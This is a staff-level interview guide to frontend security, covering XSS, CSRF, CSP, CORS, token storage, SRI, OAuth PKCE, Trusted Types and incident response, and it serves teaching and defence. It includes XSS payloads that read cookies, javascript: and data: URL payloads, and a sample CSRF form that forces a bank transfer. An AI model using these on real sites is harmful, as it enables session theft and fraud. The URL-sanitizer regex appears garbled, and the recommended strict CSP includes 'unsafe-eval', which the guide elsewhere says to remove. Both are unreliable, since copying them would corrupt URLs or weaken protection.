# Frontend Security

A staff-level interview guide to securing the browser-facing layer of modern web applications: how attacks like XSS, CSRF, and clickjacking work, the defenses (CSP, SameSite cookies, SRI, CORS), and how to architect secure SPA authentication. Knowledge is current through 2026.

[← Back to master index](../README.md)

## Table of Contents

- [🟢 Basic (0–2 yrs)](#-basic-02-yrs)
- [🟡 Intermediate (3–7 yrs)](#-intermediate-37-yrs)
- [🟠 Advanced (8–12 yrs)](#-advanced-812-yrs)
- [🔴 Expert (15+ yrs)](#-expert-15-yrs)
- [✅ Key Takeaways](#-key-takeaways)
- [⚠️ Common Pitfalls](#️-common-pitfalls)
- [📚 Further Reading](#-further-reading)

---

## 🟢 Basic (0–2 yrs)

### Q1. [Theory] What is Cross-Site Scripting (XSS) and what are its three main types?

XSS is a class of injection vulnerability where an attacker gets the browser to execute attacker-controlled JavaScript in the context (origin) of a trusted site. Because the script runs with the victim's session, it can read cookies (if not `HttpOnly`), exfiltrate tokens from `localStorage`, perform actions as the user, keylog, or rewrite the DOM. The root cause is almost always **untrusted data being interpreted as code** rather than treated as inert text.

The three classic types:

```
1. STORED (persistent)
   Attacker -> POST malicious <script> -> server DB -> served to every viewer
   e.g. a comment field that renders raw HTML. Highest impact: hits all users.

2. REFLECTED (non-persistent)
   Attacker crafts URL with payload -> server echoes it back in the response
   e.g. ?q=<script>... rendered into a "search results for X" page.
   Requires luring the victim to click a crafted link.

3. DOM-BASED
   Payload never touches the server; client-side JS reads attacker-controlled
   source (location.hash, document.URL) and writes it to a sink (innerHTML, eval).
   e.g. element.innerHTML = location.hash.slice(1)
```

The fix differs slightly per type, but the unifying principle is **context-aware output encoding and avoiding dangerous sinks**.

### Q2. [Theory] What is the Same-Origin Policy (SOP) and why does it matter?

The Same-Origin Policy is the browser's foundational security boundary. An **origin** is the triple `(scheme, host, port)` — `https://app.com` and `http://app.com` are different origins (scheme differs), as are `https://app.com` and `https://api.app.com` (host differs). SOP restricts how a document or script from one origin can interact with resources from another: it cannot read the response of a cross-origin `fetch` by default, cannot read another origin's cookies, and cannot access another frame's DOM. Without SOP, any malicious site you visit could read your authenticated Gmail or bank session in another tab. Crucially, SOP blocks *reading* cross-origin responses but does **not** block *sending* cross-origin requests — that asymmetry is exactly why CSRF exists.

### Q3. [Theory] What is the difference between authentication and authorization, and where does frontend security fit?

**Authentication** answers "who are you?" (verifying identity via passwords, tokens, passkeys). **Authorization** answers "what are you allowed to do?" (enforcing permissions). The critical frontend security rule: **the frontend can never be the source of truth for either.** Client-side checks (hiding a button, guarding a route) are purely UX — they improve experience but provide zero security because the user controls the browser and can bypass any client logic. Every authorization decision must be re-enforced on the server for each request. Treating client-side guards as security is one of the most common and dangerous junior mistakes.

### Q4. [Practical] You see `element.innerHTML = userInput` in a code review. What's wrong and how do you fix it?

This is a textbook DOM-based XSS sink. `innerHTML` parses its string as HTML, so if `userInput` contains `<img src=x onerror=alert(document.cookie)>`, the browser executes it. The fix depends on intent:

- **If you only need text** (the common case): use `element.textContent = userInput`. This treats the input as inert text — no parsing, no execution. This is the simplest and safest fix.
- **If you genuinely need to render HTML** (e.g., a rich-text comment): sanitize first with a vetted library like **DOMPurify**: `element.innerHTML = DOMPurify.sanitize(userInput)`.
- **Better still**, use a framework (React, Vue, Angular) that escapes by default, so you never hand-write this.

In production I'd also add an ESLint rule (e.g. `no-unsanitized/property`) to catch `innerHTML` assignments in CI, because catching it in review is not scalable.

### Q5. [Theory] Why should production traffic always use HTTPS, and what does HSTS add on top?

HTTPS (TLS) provides **confidentiality** (eavesdroppers can't read traffic), **integrity** (no tampering/injection in transit), and **authentication** (you're talking to the real server via its certificate). Without it, anyone on the network path — coffee-shop Wi-Fi, a malicious ISP, a compromised router — can read session cookies and inject scripts into responses.

But plain HTTPS still has a gap: the *first* request often goes to `http://` (the user types `example.com`), creating a window for an SSL-stripping man-in-the-middle attack. **HSTS (HTTP Strict Transport Security)** closes this. The server sends `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`, instructing the browser to *only* ever connect to that host over HTTPS for the next year — it upgrades `http://` to `https://` before sending anything. With `preload`, the domain is hardcoded into browsers' built-in HSTS list, protecting even the very first visit.

### Q6. [Coding] Write a function that safely escapes a string for insertion into HTML content.

**Problem:** Given an arbitrary user string, produce a version safe to interpolate into HTML text/attribute context, neutralizing the five characters that have special meaning in HTML.

```javascript
// Approach 1: explicit character map (works anywhere, no DOM needed — SSR-safe)
const HTML_ENTITIES = {
  '&': '&amp;',   // must be replaced FIRST to avoid double-encoding
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#x27;',  // &apos; is not valid in HTML4; use numeric entity
};

function escapeHtml(input) {
  if (input == null) return '';            // edge case: null/undefined
  return String(input).replace(/[&<>"']/g, (ch) => HTML_ENTITIES[ch]);
}

// Approach 2: leverage the DOM (browser only). The browser does the encoding.
function escapeHtmlDom(input) {
  const div = document.createElement('div');
  div.textContent = String(input ?? '');
  return div.innerHTML;
}

// Usage
escapeHtml('<script>alert(1)</script>');
// => "&lt;script&gt;alert(1)&lt;/script&gt;"
```

**Edge cases:** `&` must be escaped first (otherwise you double-encode entities you just produced); non-string inputs (numbers, null) must be coerced; this only covers **HTML content/attribute** context — it is *not* safe for `<script>` blocks, inline event handlers, `style`, or `href="javascript:"` URLs, each of which needs context-specific encoding.

**Time/Space:** O(n) time over the string length, O(n) space for the output string.

---

## 🟡 Intermediate (3–7 yrs)

### Q7. [Theory] How do React, Vue, and Angular protect against XSS by default, and how can you still introduce it?

All three modern frameworks treat values bound into templates as **text by default** and auto-escape them when rendering into HTML content. In React, `{userInput}` in JSX is HTML-escaped; in Vue, `{{ userInput }}` mustache interpolation is escaped; in Angular, `{{ }}` interpolation and property bindings run through built-in sanitization with a `DomSanitizer`. This eliminates the vast majority of XSS because developers rarely write raw `innerHTML`.

You re-introduce XSS by opting out of these protections:

```javascript
// React — the prop name is deliberately scary
<div dangerouslySetInnerHTML={{ __html: userInput }} />   // ☠️ raw HTML

// Vue
<div v-html="userInput"></div>                            // ☠️ raw HTML

// Angular
[innerHTML]="userInput"  // sanitized, BUT bypassSecurityTrustHtml() disables it ☠️
```

Other escape hatches: rendering a user-controlled value into `href`/`src` (enables `javascript:` URLs), passing user data to `eval`/`new Function`, or injecting `<script>`/`<style>` server-side before hydration. The rule: **anything ending in raw `innerHTML` must be DOMPurify-sanitized first**, and user-controlled URLs must be protocol-validated (allow only `http`, `https`, `mailto`).

### Q8. [Theory] Explain CSRF. Why does it work despite the Same-Origin Policy?

Cross-Site Request Forgery tricks a logged-in user's browser into making a state-changing request to a site where they're authenticated, *without* the attacker reading any response. It exploits **ambient authority**: cookies are attached automatically to requests to their domain, regardless of which site initiated the request. SOP prevents the attacker from *reading* the response, but the malicious request still *executes* — and for a state-changing action (transfer money, change email, delete account), the attacker doesn't need to read anything.

```
Victim logged into bank.com (session cookie set)
        |
        v
Visits evil.com which contains:
   <form action="https://bank.com/transfer" method="POST" id="f">
     <input name="to" value="attacker"><input name="amount" value="10000">
   </form>
   <script>document.getElementById('f').submit()</script>
        |
        v
Browser POSTs to bank.com WITH the session cookie attached automatically
        |
        v
bank.com sees a valid session -> executes transfer. Attacker never read a response.
```

The defenses are anti-CSRF tokens, `SameSite` cookies, and verifying `Origin`/`Sec-Fetch` headers — covered next.

### Q9. [Practical] Walk through how you'd defend a form-based app against CSRF in 2026.

Layered defense is the right answer — no single control is sufficient:

1. **`SameSite` cookies (primary, baseline).** Set session cookies `SameSite=Lax` (the modern browser default) or `SameSite=Strict`. With `Lax`, cookies are *not* sent on cross-site POST/PUT/DELETE — which kills the classic auto-submitting-form attack. `Strict` blocks them even on top-level navigations (more secure, but breaks "click a link in an email and arrive logged in"). For cookies used in genuine cross-site contexts you need `SameSite=None; Secure`.
2. **Anti-CSRF token (defense in depth).** Use the **synchronizer token pattern** (server generates a per-session/per-request token, embeds it in the form, validates on submit) or the **double-submit cookie pattern** (token in both a cookie and a header/field; server checks they match). Tokens protect against edge cases where `SameSite` is weak or unsupported.
3. **Verify `Origin`/`Referer` and `Sec-Fetch-*` headers.** For state-changing requests, reject if `Origin` isn't your own. `Sec-Fetch-Site: same-origin` is a modern, hard-to-forge signal.
4. **Never use GET for state changes** — GET requests are trivially triggered via `<img src>`.

**In production**, I'd lean on `SameSite=Lax` + a framework-provided CSRF token (Django, Rails, Spring Security all ship one) and `Origin` checks at the gateway. Note: pure token-based auth via `Authorization: Bearer` header (not cookies) is structurally immune to classic CSRF, because the token isn't sent automatically — but that trade-off opens XSS token-theft concerns (see Q12).

### Q10. [Theory] What is Content Security Policy (CSP) and how does it mitigate XSS?

CSP is a defense-in-depth HTTP header (`Content-Security-Policy`) that tells the browser which sources of content are allowed to load and execute. Even if an attacker successfully injects markup, a strong CSP can prevent that injected script from *running*, turning a critical XSS into a non-event. It works by whitelisting trusted origins per resource type via directives.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m';   # only same-origin + scripts with this nonce
  object-src 'none';                   # kill Flash/plugin vectors
  base-uri 'self';                     # prevent <base> hijacking
  frame-ancestors 'none';              # anti-clickjacking (replaces X-Frame-Options)
```

The single most important rule: **avoid `'unsafe-inline'` for scripts.** A policy that allows inline scripts provides almost no XSS protection because injected `<script>...</script>` is inline. The modern best practice is a **nonce-based** or **hash-based** strict CSP combined with `strict-dynamic`:

```
script-src 'nonce-{random}' 'strict-dynamic' https: 'unsafe-eval';
```

`'strict-dynamic'` lets a trusted (nonced) script load further scripts it trusts, while ignoring host whitelists — this scales well for apps with dynamic script loading and is what Google recommends. Always deploy first in **report-only** mode (`Content-Security-Policy-Report-Only` with `report-to`) to find violations before enforcing.

### Q11. [Practical] Your app must call an API on a different subdomain. Walk through CORS end to end.

CORS (Cross-Origin Resource Sharing) is the controlled relaxation of SOP. The *server* opts in to letting specific origins read its responses by sending CORS headers. The flow:

```
Simple request (GET/POST with simple headers, no custom headers):
  Browser sends:   Origin: https://app.example.com
  Server replies:  Access-Control-Allow-Origin: https://app.example.com
  -> Browser lets JS read the response. If header missing/mismatched -> blocked.

Preflighted request (PUT/DELETE, or custom headers like Authorization, or
non-simple Content-Type like application/json):
  1. Browser sends OPTIONS "preflight":
       Origin: https://app.example.com
       Access-Control-Request-Method: PUT
       Access-Control-Request-Headers: authorization, content-type
  2. Server must reply:
       Access-Control-Allow-Origin: https://app.example.com
       Access-Control-Allow-Methods: GET, PUT, DELETE
       Access-Control-Allow-Headers: authorization, content-type
       Access-Control-Max-Age: 600        # cache preflight 10 min
  3. Only if preflight passes does the browser send the real request.
```

Key production points: **(a)** If you send cookies/credentials cross-origin you must set `Access-Control-Allow-Credentials: true` **and** echo a *specific* origin — the wildcard `Access-Control-Allow-Origin: *` is forbidden with credentials. **(b)** Reflecting `Origin` back blindly (`Allow-Origin: <whatever Origin sent>`) plus `Allow-Credentials: true` is a serious misconfiguration — validate against an allowlist. **(c)** CORS is *not* an authentication mechanism; it's a browser-enforced read restriction. A non-browser client (curl, server) ignores CORS entirely, so never rely on it for access control.

### Q12. [Practical] Where should I store auth tokens: cookies or localStorage? Discuss the trade-offs.

This is *the* canonical SPA security question. There is no perfect answer — it's a trade-off between XSS and CSRF exposure:

```
                 localStorage / sessionStorage        Cookie (HttpOnly)
XSS exposure     HIGH — any injected JS reads it      LOW — JS cannot read HttpOnly
CSRF exposure    NONE — not auto-sent                 YES — auto-sent (needs SameSite)
Sent to server   manually via Authorization header    automatically
XSS = game over  token stolen, full impersonation     cookie safe, but JS can still
                                                       *act* as user while page open
```

**The consensus best practice:** store tokens in **`HttpOnly`, `Secure`, `SameSite=Lax/Strict` cookies**, not `localStorage`. Rationale: XSS is the more common and more catastrophic vulnerability, and `localStorage` offers it zero protection — a single injected script exfiltrates the token, which the attacker can then replay from anywhere, even after the user closes the tab. With `HttpOnly` cookies, an XSS attacker can still *act* within the live page but cannot *steal* the long-lived credential, and you mitigate the resulting CSRF surface with `SameSite` + tokens.

**Best of both (the modern pattern):** keep a **short-lived access token in memory** (a JS variable — gone on refresh, never persisted) and a **long-lived refresh token in an `HttpOnly` cookie** scoped to the `/auth/refresh` path. This minimizes both the token-theft window and the persistence surface. The **BFF (Backend-for-Frontend)** pattern goes further — the browser holds only an `HttpOnly` session cookie and never sees the actual OAuth tokens at all, which the BFF stores server-side. For browser-only apps in 2026, BFF is the recommended OAuth pattern.

### Q13. [Theory] What is clickjacking and how do you defend against it?

Clickjacking (UI redress) tricks a user into clicking something different from what they perceive. The attacker loads your site in a transparent `<iframe>` overlaid on their own decoy UI, so a user thinking they click "Win a prize" actually clicks "Confirm transfer" on your framed page. Defenses, in order of preference:

1. **`Content-Security-Policy: frame-ancestors 'none'`** (or a specific allowlist) — the modern standard, more flexible than the legacy header, supports multiple origins.
2. **`X-Frame-Options: DENY`** (or `SAMEORIGIN`) — the older header; still set it for legacy browser coverage, but `frame-ancestors` supersedes it where both are present.
3. **`SameSite` cookies** as a secondary mitigation — if a framed sensitive action requires a cookie that won't be sent cross-site, the attack is blunted.

```
X-Frame-Options: DENY                 # cannot be framed at all
Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com;
```

A subtle point: `X-Frame-Options` only takes one value and `ALLOW-FROM` is deprecated/poorly supported — if you need multiple allowed framers, you *must* use `frame-ancestors`.

### Q14. [Coding] Implement the double-submit-cookie CSRF defense (client + a token generator).

**Problem:** Implement a cryptographically strong CSRF token generator and the client logic that reads the token from a cookie and attaches it to a request header, so the server can verify the cookie value matches the header value.

```javascript
// --- Token generation (server-side, e.g. on session start) ---
import { randomBytes } from 'node:crypto';

function generateCsrfToken() {
  return randomBytes(32).toString('base64url'); // 256 bits of entropy
}
// Server sets it as a NON-HttpOnly cookie so JS can read it:
//   Set-Cookie: csrfToken=<token>; Secure; SameSite=Strict; Path=/

// --- Client: read cookie + attach as header on mutating requests ---
function getCookie(name) {
  const match = document.cookie.match(
    new RegExp('(?:^|; )' + name.replace(/([.$?*|{}()[\]\\/+^])/g, '\\$1') + '=([^;]*)')
  );
  return match ? decodeURIComponent(match[1]) : null;
}

async function securePost(url, body) {
  const csrfToken = getCookie('csrfToken');
  if (!csrfToken) throw new Error('Missing CSRF token');

  return fetch(url, {
    method: 'POST',
    credentials: 'include',                 // send cookies
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,            // header copy of the cookie
    },
    body: JSON.stringify(body),
  });
}

// --- Server verification (conceptual) ---
// const ok = req.cookies.csrfToken &&
//            req.headers['x-csrf-token'] &&
//            timingSafeEqual(req.cookies.csrfToken, req.headers['x-csrf-token']);
// if (!ok) return res.status(403).end();
```

**Why it works:** an attacker on `evil.com` can trigger a cross-site request, and the browser will attach the `csrfToken` *cookie* — but SOP prevents that attacker's JS from *reading* the cookie value to also place it in the `X-CSRF-Token` *header*. The server requires both to match, so the forged request fails. **Edge cases:** must use `timingSafeEqual` for the comparison (avoid timing leaks); the cookie must be `SameSite` to harden it further; subdomains can read parent-domain cookies, so pair with signed/HMAC tokens if subdomains are untrusted. **Time/Space:** O(n) over token length for the comparison; negligible space.

### Q15. [Theory] What is Subresource Integrity (SRI) and when do you need it?

SRI lets the browser verify that a fetched resource (script or stylesheet, typically from a CDN) hasn't been tampered with. You add an `integrity` attribute containing a cryptographic hash of the expected content; the browser computes the hash of what it downloaded and **refuses to execute it if the hashes don't match**.

```html
<script
  src="https://cdn.example.com/lib@1.2.3/dist/lib.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"></script>
```

You need it whenever you load third-party code from an origin you don't fully control — public CDNs being the prime case. It defends against a **CDN compromise or a supply-chain swap**: if an attacker breaches the CDN and replaces `lib.min.js` with a malicious version, the hash no longer matches and the browser blocks it. The trade-off: SRI breaks if the resource legitimately changes (so it only works for pinned, immutable versions, never "latest"), and you must regenerate hashes on every dependency bump. `crossorigin="anonymous"` is required for the browser to read the cross-origin response for hashing.

### Q16. [Practical] How do you assess and reduce frontend supply-chain / dependency risk?

A modern frontend pulls in hundreds of transitive npm packages — each is code running with your app's privileges, and a single compromised package (typosquat, hijacked maintainer account, malicious post-install script) can exfiltrate tokens or inject a crypto-miner. Real incidents — `event-stream`, the `ua-parser-js` hijack, the `node-ipc` protestware, the 2024 `polyfill.io` domain takeover that served malware to 100k+ sites — make this a board-level concern.

My production playbook:

- **Lockfiles + `npm ci`**: deterministic, reproducible installs; never `npm install` in CI.
- **Automated vuln scanning**: `npm audit`, Dependabot/Renovate, Snyk, or `socket.dev` in CI gating on severity.
- **Generate an SBOM** (CycloneDX/SPDX) so you can answer "are we affected by CVE-X?" in minutes.
- **Disable lifecycle scripts where possible** (`npm ci --ignore-scripts`) to neutralize malicious `postinstall`.
- **Pin versions / vet updates**; prefer fewer, well-maintained dependencies; review the dependency tree before adding a package.
- **SRI for any CDN-hosted asset**; self-host critical third-party scripts so you control the supply chain (the polyfill.io lesson).
- **Subresource sandboxing**: load risky third-party widgets (chat, analytics) in a sandboxed iframe so a compromise is contained.
- **Provenance**: prefer packages published with npm provenance / signed attestations.

---

## 🟠 Advanced (8–12 yrs)

### Q17. [Theory] Explain the full OAuth 2.0 Authorization Code flow with PKCE for an SPA, and why PKCE is mandatory.

SPAs are **public clients** — they cannot keep a `client_secret` secret because all their code ships to the browser. The original implicit flow (tokens returned in the URL fragment) is now deprecated because tokens leaked via history, referrer headers, and logs. The current standard (OAuth 2.1 / BCP) is **Authorization Code flow with PKCE** (Proof Key for Code Exchange).

```
1. SPA generates:
     code_verifier = random 43-128 char string (kept in memory / sessionStorage)
     code_challenge = BASE64URL( SHA-256(code_verifier) )

2. Redirect to authorization server:
     /authorize?response_type=code&client_id=...&redirect_uri=...
                &code_challenge=<challenge>&code_challenge_method=S256
                &state=<csrf>&scope=...

3. User authenticates & consents -> server redirects back:
     /callback?code=<authcode>&state=<csrf>     (verify state matches!)

4. SPA exchanges code for tokens (POST to /token):
     grant_type=authorization_code&code=<authcode>
     &code_verifier=<original verifier>&client_id=...

5. Authorization server checks:  SHA-256(code_verifier) == stored code_challenge
   -> if match, returns access_token (+ refresh_token)
```

**Why PKCE is mandatory:** without it, an attacker who intercepts the authorization `code` (via a malicious browser extension, a logged redirect, or an OS-level URL handler hijack on mobile) could redeem it for tokens. PKCE binds the code to the original requester — the attacker doesn't have the `code_verifier`, and the `code_challenge` was sent over a separate channel, so a stolen code is useless. The `state` parameter is a separate CSRF protection for the redirect itself. In 2026, the recommended posture for browser apps is PKCE *plus* a BFF so the SPA never directly handles long-lived tokens.

### Q18. [Practical] You're rolling out a strict CSP to a large legacy app with inline scripts and many third-party tags. How do you do it without breaking production?

Big-bang CSP enforcement on a legacy app will break it. My phased rollout:

1. **Inventory & baseline in report-only.** Deploy `Content-Security-Policy-Report-Only` with a strict candidate policy and a `report-to`/`report-uri` endpoint. This *reports* violations without *blocking* anything, so production keeps working while you collect real-world data on every script source, inline handler, and `eval` your app actually uses.
2. **Triage the reports.** Categorize: legitimate first-party inline scripts → migrate to external files or add nonces/hashes; legitimate third parties → add to the allowlist (or better, nonce them via `strict-dynamic`); suspicious sources → potential existing XSS or rogue tag-manager injection.
3. **Adopt nonce + `strict-dynamic`** rather than maintaining an ever-growing host allowlist. Generate a per-response nonce server-side, stamp it on trusted `<script>` tags, and let `strict-dynamic` propagate trust to dynamically loaded scripts. This is far more maintainable for an app with many tags.
4. **Eliminate `'unsafe-inline'` and `'unsafe-eval'`** — the hardest part. Move inline event handlers (`onclick=`) to `addEventListener`, replace `eval`/`new Function`/string `setTimeout` with safe equivalents. Consider **Trusted Types** (`require-trusted-types-for 'script'`) to lock DOM XSS sinks entirely.
5. **Flip to enforce gradually** — by route or by percentage rollout, monitoring the report endpoint for regressions. Keep report-only running alongside enforce as a regression canary.

The key insight: report-only mode decouples *learning* from *breaking*, which is what makes a safe rollout possible at scale.

### Q19. [Theory] What are Trusted Types and how do they fundamentally change DOM-XSS prevention?

Trusted Types is a browser API (enabled via CSP `require-trusted-types-for 'script'`) that attacks the *root cause* of DOM XSS: passing strings to dangerous sinks. When enabled, the browser **refuses to accept a plain string** at injection sinks like `innerHTML`, `script.src`, `eval`, and `setTimeout(string)`. Instead, the string must first pass through a named **policy** that returns a typed object (`TrustedHTML`, `TrustedScript`, `TrustedScriptURL`).

```javascript
// Without Trusted Types: el.innerHTML = userInput  -> potential XSS
// With Trusted Types enforced, that line THROWS unless you do:

const policy = trustedTypes.createPolicy('sanitizer', {
  createHTML: (input) => DOMPurify.sanitize(input), // sanitize in ONE place
});

el.innerHTML = policy.createHTML(userInput);  // only TrustedHTML is accepted
```

This shifts security from "audit every one of the thousands of sink call-sites" to "audit the handful of policies." It makes DOM XSS **structurally impossible** to introduce accidentally — any unsanitized string assignment throws at runtime (and can be caught in report-only mode first). Google adopted it across its products and credits it with eliminating entire classes of DOM XSS. It's well-supported in Chromium browsers; Safari/Firefox support has been arriving, and you pair it with a polyfill and report-only rollout.

### Q20. [Coding] Implement a safe URL sanitizer that blocks `javascript:` and `data:` scheme injection.

**Problem:** User-provided URLs (avatar links, "website" profile fields) are rendered into `href`/`src`. Naive rendering allows `javascript:alert(1)` to execute on click, or a `data:text/html` URL to run a hostile document. Build a sanitizer that allows only safe schemes.

```javascript
const SAFE_PROTOCOLS = new Set(['http:', 'https:', 'mailto:', 'tel:']);

function sanitizeUrl(rawUrl, { base = window.location.href } = {}) {
  if (typeof rawUrl !== 'string') return 'about:blank';

  // Strip control chars/whitespace attackers use to evade naive regexes,
  // e.g. "java\nscript:alert(1)" or "  javascript:alert(1)"
  const cleaned = rawUrl.trim().replace(/[ --]/g, '');

  let parsed;
  try {
    parsed = new URL(cleaned, base);   // robust parsing > regex
  } catch {
    return 'about:blank';              // malformed -> safe default
  }

  if (!SAFE_PROTOCOLS.has(parsed.protocol)) {
    return 'about:blank';              // blocks javascript:, data:, vbscript:, blob:
  }
  return parsed.href;
}

// Examples
sanitizeUrl('javascript:alert(document.cookie)'); // "about:blank"
sanitizeUrl('  jAvAsCrIpT:alert(1)');             // "about:blank" (case-insensitive)
sanitizeUrl('data:text/html,<script>x</script>'); // "about:blank"
sanitizeUrl('https://example.com/profile');       // "https://example.com/profile"
sanitizeUrl('/relative/path');                     // resolved absolute https URL
```

**Why `new URL` over regex:** regex-based scheme checks are repeatedly bypassed via case tricks (`JaVaScRiPt:`), embedded null bytes, tab/newline injection, and protocol-relative URLs. The URL parser normalizes all of this. **Edge cases handled:** non-string input, malformed URLs, control-character evasion, case-insensitivity (the parser lowercases the protocol), and relative URLs. **Allowlist beats blocklist** — you can never enumerate every dangerous scheme, so allow only known-safe ones. **Time/Space:** O(n) over URL length; O(n) space.

### Q21. [Practical] An audit finds your `postMessage` handler is exploitable. What's the vulnerability class and how do you fix it?

`window.postMessage` enables cross-origin communication between windows/iframes, but it's a frequent XSS and data-leak vector when the handler doesn't validate the sender. Two classic bugs:

```javascript
// ❌ VULNERABLE
window.addEventListener('message', (e) => {
  // Bug 1: no origin check — ANY site that frames/opens us can send messages
  // Bug 2: passes attacker data straight to a dangerous sink
  document.getElementById('out').innerHTML = e.data.html;
});

// And on the sending side:
otherWindow.postMessage(secretData, '*'); // ❌ '*' leaks to whatever loaded there
```

```javascript
// ✅ FIXED
const ALLOWED_ORIGINS = new Set(['https://trusted-partner.example.com']);

window.addEventListener('message', (e) => {
  if (!ALLOWED_ORIGINS.has(e.origin)) return;          // 1. validate origin
  if (e.source !== expectedFrame.contentWindow) return; // 2. validate source window
  let msg;
  try { msg = JSON.parse(e.data); } catch { return; }   // 3. validate shape
  if (msg.type !== 'UPDATE_NAME' || typeof msg.value !== 'string') return;
  nameEl.textContent = msg.value;                        // 4. safe sink, not innerHTML
});

// Sending: always target a specific origin, never '*'
iframe.contentWindow.postMessage(JSON.stringify(payload), 'https://trusted-partner.example.com');
```

The fix has four parts: **(1)** always check `event.origin` against an allowlist; **(2)** optionally verify `event.source`; **(3)** validate the message structure (treat it as untrusted input); **(4)** never route message data into `innerHTML`/`eval`. On the *sending* side, never use `'*'` as the target origin for sensitive data — specify the exact recipient origin so a hijacked frame can't intercept it.

### Q22. [Theory] What modern browser features (CSP nonces, COOP/COEP, fetch metadata, partitioned cookies) form a layered defense, and what does each protect?

Modern frontend security is **defense in depth** — no single header is sufficient. The 2026 stack:

```
Layer                          Header / Feature                Protects against
-----------------------------  ------------------------------  --------------------------
Script execution control       CSP (nonce + strict-dynamic)    XSS exploitation
DOM sink hardening             Trusted Types                   DOM-based XSS
Framing                        CSP frame-ancestors / XFO       Clickjacking
Cross-origin isolation         COOP + COEP                     Spectre, XS-Leaks, gives
                                                               access to SharedArrayBuffer
Request provenance             Sec-Fetch-* (Fetch Metadata)    CSRF, XSSI, cross-site
Cookie isolation               SameSite + CHIPS (Partitioned)  CSRF, cross-site tracking
Transport                      HSTS (+ preload)                SSL stripping / MITM
Resource integrity             SRI                             CDN/supply-chain tampering
```

- **COOP** (`Cross-Origin-Opener-Policy: same-origin`) severs the `window.opener` relationship, preventing cross-origin windows from referencing each other — blocks XS-Leak and tab-nabbing attacks.
- **COEP** (`Cross-Origin-Embedder-Policy: require-corp`) requires all subresources to explicitly opt in; together COOP+COEP enable **cross-origin isolation**, mitigating Spectre-style memory side-channels and re-enabling high-precision timers / `SharedArrayBuffer`.
- **Fetch Metadata** (`Sec-Fetch-Site`, `Sec-Fetch-Mode`, `Sec-Fetch-Dest`) are browser-set, unforgeable headers letting the *server* make resource-isolation decisions — e.g., reject a state-changing request whose `Sec-Fetch-Site` isn't `same-origin`.
- **CHIPS / Partitioned cookies** (`Set-Cookie: ...; Partitioned`) scope third-party cookies to the top-level site, supporting embedded use cases in a post-third-party-cookie web while preventing cross-site tracking.

The interview-level point: a senior engineer designs these as overlapping layers so that defeating one (e.g., finding an XSS) still runs into the next (CSP blocks execution, Trusted Types blocks the sink, HttpOnly protects the token).

### Q23. [Practical] Describe a real-world frontend breach and the controls that would have prevented it.

**Case study — British Airways (2018, Magecart / formjacking).** Attackers compromised a JavaScript file loaded into BA's payment pages (a modified `modernizr` script). The injected skimmer harvested customers' card data from the checkout form and exfiltrated it to an attacker-controlled domain (`baways.com`, a lookalike). ~380,000 transactions were compromised, and BA was initially fined £183M under GDPR (later reduced to £20M). This is the archetypal **client-side supply-chain / Magecart** attack.

Controls that would have stopped or contained it:

- **Subresource Integrity (SRI)** on the loaded script — a modified file fails the hash check and won't execute.
- **A strict Content Security Policy** with a locked-down `connect-src` and `script-src` — the skimmer's exfiltration to `baways.com` would have been blocked because that origin wasn't whitelisted, and the modified inline injection wouldn't have run under a nonce-based policy. CSP's `connect-src` is specifically powerful against data exfiltration.
- **Sandboxing third-party scripts** in iframes so they can't read the payment form's DOM.
- **Self-hosting and pinning** critical scripts rather than trusting mutable third-party origins (the same lesson the 2024 polyfill.io supply-chain attack reinforced).

The takeaway for interviews: client-side security isn't just about *your* code — every third-party script on a sensitive page is part of your attack surface, and CSP + SRI are the primary controls for that surface.

---

## 🔴 Expert (15+ yrs)

### Q24. [Theory] Argue for the BFF (Backend-for-Frontend) pattern over storing OAuth tokens in the browser. When would you *not* use it?

The BFF pattern places a lightweight server-side component between the SPA and the resource/authorization servers. The browser authenticates to the BFF and receives only a **`HttpOnly`, `Secure`, `SameSite` session cookie**; the BFF performs the OAuth flow, holds the access and refresh tokens **server-side**, and proxies API calls, attaching tokens on the server.

```
   Browser (SPA)                BFF (your server)            Auth/Resource Servers
   --------------               -----------------            ---------------------
   HttpOnly session cookie  <-->  holds OAuth tokens   <-->   /token, /api/*
   NEVER sees access/refresh      attaches Bearer hdr         validates Bearer
        token                     server-side
```

**Why it's superior for browser apps:** it eliminates token theft via XSS entirely — there is no token in JS-reachable storage to steal. An XSS attacker is reduced to making requests *through* the live session (still bad, but no portable, long-lived credential is exfiltrated, and the session is bound to cookie controls you fully manage: `SameSite`, rotation, server-side revocation, IP/device binding). It centralizes refresh-token rotation and revocation server-side. This is why OAuth security BCPs now recommend BFF as the preferred topology for browser-based apps.

**When *not* to use it:** when you have no backend at all (pure static/JAMstack with only third-party APIs) and adding a server contradicts the architecture; when latency from the extra proxy hop is unacceptable for a globally distributed app and you'd need BFFs at edge everywhere; or for native mobile apps, where the OS keystore provides secure token storage and the public-client-with-PKCE model is appropriate. The trade-off is operational: a BFF is another stateful service to deploy, scale, and secure.

### Q25. [Behavioral] You discover a critical XSS in production affecting all users. Walk me through how you lead the response.

I treat this as a security incident, not a bug, and I optimize for *containment first, blame never*:

1. **Contain immediately.** Assess blast radius (who's exposed, is it being exploited?). Apply the fastest safe mitigation — often a tightened CSP via a config/CDN edge change (no full deploy needed) to neutralize execution, or feature-flagging off the vulnerable component, while the real fix is built. A CSP that turns a critical into a non-event in minutes is exactly why I'd have it deployed already.
2. **Convene the right people.** Declare an incident, assign an incident commander (likely me), pull in security, the owning team, and comms/legal if user data may be affected. Open a single source-of-truth channel.
3. **Eradicate & verify.** Build the proper fix (output encoding / DOMPurify / Trusted Types policy), add a regression test that reproduces the exploit, and verify in staging that the payload no longer executes.
4. **Recover & assess data exposure.** Determine if tokens/sessions could have been stolen; if so, rotate secrets and force re-authentication / session invalidation. Honor breach-disclosure obligations (GDPR 72-hour clock, etc.) with legal.
5. **Blameless postmortem.** Root-cause *why the class of bug was possible*, not just the one instance. Outcomes are systemic: enable Trusted Types, add CI linting for dangerous sinks, tighten CSP, improve code-review checklists. The measure of a good response is that this *category* of bug becomes structurally harder, not that one line got patched.

The leadership signal I want to convey: calm, layered, evidence-driven, and focused on systemic prevention over individual fault.

